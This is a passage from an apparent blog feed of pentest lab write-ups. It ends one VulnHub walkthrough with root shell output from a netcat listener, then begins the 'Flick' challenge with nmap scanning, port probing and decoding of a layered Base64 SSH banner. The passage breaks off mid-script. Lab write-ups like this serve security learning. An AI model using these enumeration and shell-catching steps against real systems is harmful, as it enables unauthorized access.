<p>And on my netcat side:</p>

<p><code>plain
sh-4.2# whoami
whoami
root
sh-4.2# cat /root/flag.txt
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
</code></p>

<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>

<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>

<p><img class="center" src="/images/pentest/relativity/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;fortune cowsay&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Flick]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/"/>
    <updated>2015-02-09T15:22:24+02:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick</id>
    <content type="html"><![CDATA[<p>The next challenge I&rsquo;m going for from the myriad of options on VulnHub will be Flick, by <a href="https://www.vulnhub.com/author/leonjza,57/">Leonjza</a>!</p>

<blockquote><p>Welcome to the flick boot2root!</p>

<ul>
<li>Where is the flag?</li>
<li>What do you need to flick to find it?</li>
</ul>


<p>Completing &ldquo;flick&rdquo; will require some sound
thinking, good enumeration skills &amp; time! The
objective is to find and read the flag that
lives /root/</p>

<p>As a bonus, can you get root command execution?</p></blockquote>

<!-- more -->


<p>``` plain
nmap -A -p1-65535 192.168.80.129</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-09 15:28 EET
Nmap scan report for 192.168.80.129
Host is up (0.00056s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port8881-TCP:V=6.47%I=7%D=2/9%Time=54D8B5FC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,5F,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x2
SF:0password\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20ne
SF:w\x20door:\n>\x20&rdquo;)%r(GetRequest,78,&ldquo;Welcome\x20to\x20the\x20admin\x20s
SF:erver.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
SF:\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/\x20HTTP/1.0
SF:\r\n\r\n\n>\x20&rdquo;)%r(FourOhFourRequest,9B,&ldquo;Welcome\x20to\x20the\x20admin
SF:\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20s
SF:witch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/nice%20p
SF:orts%2C/Tri%6Eity.txt%2ebak\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(GenericLin
SF:es,6A,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20pas
SF:sword\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x2
SF:0door:\n>\x20OK:\x20\r\n\r\n\n>\x20&rdquo;)%r(HTTPOptions,7C,&ldquo;Welcome\x20to\x
SF:20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'flic
SF:k'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OP
SF:TIONS\x20/\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RTSPRequest,7C,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0OPTIONS\x20/\x20RTSP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RPCCheck,92,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0\x80\0\0(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;)%r(DNSVersionBindReq,86,&ldquo;
SF:Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20password\x
SF:20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\
SF:n>\x20OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\
SF:0\x10\0\x03\n>\x20&rdquo;)%r(DNSStatusRequest,74,&ldquo;Welcome\x20to\x20the\x20adm
SF:in\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x2
SF:0switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\0\x0c\0\0\x10
SF:\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;);
MAC Address: 00:0C:29:7A:27:7B (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Not much to work with. I netcat'ed to the 8881 port:</p>

<p>``` plain
nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>letmein?
OK: letmein?</p>

<p>```</p></blockquote>

<p>I tried bombarding it with long strings to see how it would behave, but nothing happened. Next thing I just thought to try SSH and it would seem this is the more likely route:</p>

<p>``` plain
ssh 192.168.80.129
The authenticity of host &lsquo;192.168.80.129 (192.168.80.129)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.80.129&rsquo; (ECDSA) to the list of known hosts.</p>

<p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d</p>

<p> .o88o. oooo   o8o            oooo      <br/>
 888 <code>"</code>888   <code>"'           </code>888      <br/>
o888oo   888  oooo   .ooooo.   888  oooo<br/>
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P' <br/>
 888     888   888  888        888888.  <br/>
 888     888   888  888   .o8  888 <code>88b.  
o888o   o888o o888o</code>Y8bod8P' o888o o888o</p>

<p><a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#49;&#50;&#57;">&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#56;&#x30;&#46;&#x31;&#50;&#x39;</a>&rsquo;s password:
```</p>

<p>I copied that block of hex to an online hex to string converter that spit out a Base64 encoded string:</p>

<p><code>plain
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
</code></p>

<p>Moving to a Base64 decoder, it appears to be decoded into&hellip;another Base64 string?</p>

<p><code>plain
Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
</code></p>

<p>This kept happening for the next decodings, so I lost my patience and went to Python to script the decoding process:</p>

<p>``` python</p>

<p>import base64</p>

<p>secret = &lsquo;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJz